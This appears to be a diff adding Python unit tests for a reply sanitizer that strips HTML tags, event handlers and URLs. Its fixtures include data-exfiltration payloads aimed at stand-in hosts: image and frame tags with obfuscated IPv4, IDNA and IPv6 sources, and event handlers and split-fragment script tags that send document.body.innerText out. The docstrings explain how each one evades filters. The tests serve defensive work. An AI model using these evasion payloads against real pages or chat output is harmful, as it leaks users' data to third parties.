@@ -2621,3 +2621,113 @@ class SanitizeReplyTests(TestCase):
     def test_bare_domain_with_double_slash_page_survives_intact(self):
         text = "See example.com//page for the changelog"
         self.assertEqual(self._clean(text), text)
+
+    # --- fidelity: round-3 additions --------------------------------------------
+
+    def test_cpp_template_syntax_survives_intact(self):
+        text = "std::vector<std::string> v;"
+        self.assertEqual(self._clean(text), text)
+
+    def test_arrow_function_with_comparisons_survives_intact(self):
+        """Contains both "=" and "<"/">" near each other, but never in the
+        <name ...=...> shape the attribute-assignment matcher looks for —
+        the only "<" is immediately followed by a digit, which can never
+        start a tag name."""
+        text = "const f = (a) => a<10 && a>1;"
+        self.assertEqual(self._clean(text), text)
+
+    # --- N1: an expanded tag name list plus a generic attribute-bearing ---------
+    # --- catch-all, not URL-matcher awareness of exotic host forms --------------
+
+    def test_strips_image_tag_with_decimal_ipv4_src(self):
+        """<image> parses as <img> in every HTML5 parser but was not on the
+        round-2 allowlist. The decimal-IPv4 host (no dot) would also evade
+        every URL matcher — irrelevant here because the whole tag, src and
+        all, is removed as one unit."""
+        out = self._clean('Great fit! <image src="//3232235777/p?d=Ada">')
+        self.assertEqual(out, "Great fit!")
+
+    def test_strips_image_tag_with_idna_dot_src(self):
+        """U+3002 (IDEOGRAPHIC FULL STOP) is IDNA-mapped to "." by browsers
+        but is not literally a dot our URL matchers would recognise."""
+        out = self._clean("Great fit! <image src=\"//attacker。example/p?d=Ada\">")
+        self.assertEqual(out, "Great fit!")
+
+    def test_strips_image_tag_with_ipv6_literal_src(self):
+        out = self._clean('Great fit! <image src="//[2001:db8::1]/p?d=Ada">')
+        self.assertEqual(out, "Great fit!")
+
+    def test_strips_any_attribute_bearing_tag_regardless_of_name(self):
+        """<body>/<table>/<frame>/<portal>/<button> are the same shape as
+        <image>: some are on the expanded name list, some (table) are not
+        and rely entirely on the generic "any tag with an attribute
+        assignment" catch-all. Visible text (the button's "click") survives
+        even though the tag markup around it does not."""
+        self.assertEqual(
+            self._clean('Nice <body background="//3232235777/p?d=Ada">'),
+            "Nice")
+        self.assertEqual(
+            self._clean('Nice <table background="//3232235777/p?d=Ada">'),
+            "Nice")
+        self.assertEqual(
+            self._clean('Nice <frame src="//3232235777/p?d=Ada">'),
+            "Nice")
+        self.assertEqual(
+            self._clean('Nice <portal src="//3232235777/p?d=Ada">'),
+            "Nice")
+        self.assertEqual(
+            self._clean(
+                'Nice <button formaction="//3232235777/p?d=Ada">click</button>'),
+            "Nice click")
+
+    # --- N2: event handlers on an otherwise-inert, unlisted tag -----------------
+
+    def test_strips_event_handler_url_built_via_charcode(self):
+        """No scheme, no "//", no "www." literally present in the raw
+        text — nothing for a content-sniffing URL matcher to catch. The
+        payload only exists once the div's onmouseover fires. The div is
+        not on the dangerous-tag list, but it carries an attribute
+        assignment, so it is removed structurally without needing to
+        understand the JavaScript inside it."""
+        out = self._clean(
+            '<div onmouseover="location=String.fromCharCode(47,47)'
+            '+\'a.tld\'">x</div>')
+        self.assertNotIn("a.tld", out)
+        self.assertIn("x", out)
+
+    def test_strips_event_handler_url_built_via_unicode_escape(self):
+        out = self._clean(
+            '<div onmouseover="fetch(\'\\u002f\\u002f\'+\'host.tld/p?d=\'+'
+            'document.body.innerText)">hover</div>')
+        self.assertNotIn("host.tld", out)
+        self.assertIn("hover", out)
+
+    # --- N3: fixed-point tag stripping (a single pass can reassemble one) -------
+
+    def test_strips_script_tag_reassembled_from_split_fragments(self):
+        """A single .sub() pass removes the inner <img src=x> tag, which
+        splices "<scr" and "ipt>" back together into an intact "<script>"
+        that a one-shot substitution would never re-scan for."""
+        out = self._clean(
+            '<scr<img src=x>ipt>fetch("HOST"+document.body.innerText)'
+            '</script>')
+        self.assertNotIn("<script>", out)
+        self.assertNotIn("<img", out)
+
+    def test_strips_img_tag_reassembled_from_split_fragments(self):
+        out = self._clean('<i<img src=y>mg src="//3232235777/p?d=Ada">')
+        self.assertNotIn("3232235777", out)
+        self.assertNotIn("<img", out)
+
+    def test_strips_iframe_tag_reassembled_from_split_fragments(self):
+        out = self._clean('<ifr<a href=z>ame src="//3232235777/p"></iframe>')
+        self.assertNotIn("3232235777", out)
+        self.assertNotIn("<iframe", out)
+
+    # --- N4: the protocol-relative matcher must not eat its own delimiter -------
+
+    def test_protocol_relative_url_does_not_swallow_closing_paren(self):
+        text = "Our mirror (//cdn.example.tld/p) is fast"
+        out = self._clean(text)
+        self.assertNotIn("cdn.example.tld", out)
+        self.assertEqual(out, "Our mirror () is fast")
